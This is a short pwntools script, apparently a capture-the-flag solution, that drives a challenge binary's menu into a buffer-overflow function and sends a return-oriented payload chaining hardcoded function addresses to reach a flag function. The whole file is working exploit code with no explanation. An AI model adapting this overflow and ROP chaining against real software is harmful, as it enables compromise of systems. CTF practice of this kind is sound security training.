from pwn import *

p = process('./houseof')
#p = remote("challenges.auctf.com", 30012)
gdb.attach(p.pid)

def bufover():
        p.sendlineafter("Your choice: ", "2")
        p.sendlineafter("enter: ", "4")
        p.sendlineafter("Your choice: ", "3") #enter hidden room
        p.sendlineafter("exit: ", "Stephen") #initialize buffer overflow function

bufover()

get_flag = 0x5655686b
get_key1 = 0x565566de
get_key2 = 0x5655676e
get_key3 = 0x565567cd
get_key4 = 0x565567e9
arg = p32(0xfeedc0de)    
pop_ret = p32(0x5655601e)

payload= "B"*28 + p32(get_key3) + p32(get_key2) + p32(get_key1) + pop_ret + arg + p32(get_key4) + p32(get_flag)
p.sendlineafter("something: ", payload)

log.info(p.recv())
